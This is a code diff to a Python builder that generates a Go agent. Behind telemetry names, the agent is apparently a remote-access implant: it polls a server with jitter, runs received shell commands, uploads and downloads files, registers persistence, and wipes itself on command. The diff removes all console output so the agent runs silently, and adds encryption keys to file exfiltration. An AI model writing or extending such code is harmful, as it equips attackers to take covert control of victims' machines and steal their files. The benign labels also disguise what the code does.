@@ -515,8 +515,6 @@ import (
 	"encoding/hex"
 	"fmt"
 	"net/http"
-	"os"
-	"runtime"
 	"strings"
 	"time"
 
@@ -625,22 +623,6 @@ func InitializeTelemetry() {{
 		}},
 	}}
 
-	fmt.Println("=======================================")
-	fmt.Println("   Endpoint Telemetry  Initialized     ")
-	fmt.Println("=======================================")
-	fmt.Printf("  Endpoint  : %s\\n", EndpointID)
-	fmt.Printf("  Gateway   : %s\\n", TelemetryEndpoint)
-	fmt.Printf("  Interval  : %s to %s\\n", SyncDelayMin, SyncDelayMax)
-	fmt.Printf("  Profile   : %s\\n", profile.Name)
-	fmt.Printf("  Locale    : %s\\n", Locale)
-	fmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)
-
-	hostname, err := os.Hostname()
-	if err == nil {{
-		fmt.Printf("  Hostname  : %s\\n", hostname)
-	}}
-
-	fmt.Println("=======================================")
 }}
 
 '''
@@ -651,13 +633,8 @@ def _generate_main_go(persist_method):
     persist_block = ""
     if persist_method != "none":
         persist_block = """
-\t// Register auto-update service
 \tif EnablePersist {{
-\t\tif err := funcs.InstallAutoUpdater(); err != nil {{
-\t\t\tfmt.Printf("[!] Auto-update registration failed: %v\\n", err)
-\t\t}} else {{
-\t\t\tfmt.Println("[+] Auto-update registered successfully")
-\t\t}}
+\t\t_ = funcs.InstallAutoUpdater()
 \t}}
 """
 
@@ -704,23 +681,15 @@ func main() {{
 	hostname, _ := os.Hostname()
 	agentOS := runtime.GOOS
 
-	fmt.Printf("\\n[*] Starting check-in loop (jitter: %s - %s)…\\n\\n", SyncDelayMin, SyncDelayMax)
-
 	for {{
 		jobs, err := SyncDeviceState(hostname, agentOS)
 		if err != nil {{
-			fmt.Printf("[!] Check-in failed: %v\\n", err)
 			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
 			continue
 		}}
 
-		fmt.Printf("[+] Checked in - %d pending job(s)\\n", len(jobs))
-
 		for _, job := range jobs {{
-			fmt.Printf("[>] Executing job #%d: %s\\n", job.ID, job.Command)
-
 			if job.Command == FlushCommand {{
-				fmt.Println("[!] Cache flush command received from server")
 				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
 				funcs.WipeLocalCacheAndExit()
 			}}
@@ -731,7 +700,6 @@ func main() {{
 				if cdErr != nil {{
 					output = fmt.Sprintf("Error: %v", cdErr)
 				}}
-				fmt.Printf("[<] Job #%d result: %s\\n", job.ID, output)
 				_ = SubmitDiagnosticReport(job.ID, output)
 				continue
 			}}
@@ -739,11 +707,10 @@ func main() {{
 			if strings.HasPrefix(job.Command, "get ") {{
 				go func(t DiagnosticJob) {{
 					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
-					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
+					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath, KeyID, EncryptionKey)
 					if err != nil {{
 						output = fmt.Sprintf("Upload error: %v", err)
 					}}
-					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
 					_ = SubmitDiagnosticReport(t.ID, output)
 				}}(job)
 				continue
@@ -761,7 +728,6 @@ func main() {{
 					if err != nil {{
 						output = fmt.Sprintf("Download error: %v", err)
 					}}
-					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
 					_ = SubmitDiagnosticReport(t.ID, output)
 				}}(job)
 				continue
@@ -781,11 +747,7 @@ func main() {{
 				if execErr != nil && output == "" {{
 					output = fmt.Sprintf("Error: %v", execErr)
 				}}
-				fmt.Printf("[<] Job #%d result (%d bytes)\\n", t.ID, len(output))
-				err := SubmitDiagnosticReport(t.ID, output)
-				if err != nil {{
-					fmt.Printf("[!] Failed to send result for job #%d: %v\\n", t.ID, err)
-				}}
+				_ = SubmitDiagnosticReport(t.ID, output)
 			}}(job)
 		}}
 
@@ -1028,6 +990,7 @@ def build_agent():
             final_path = os.path.join(BUILDS_DIR, filename)
 
         shutil.move(output_path, final_path)
+        os.chmod(final_path, 0o755)
         file_size = os.path.getsize(final_path)
 
         # save build record
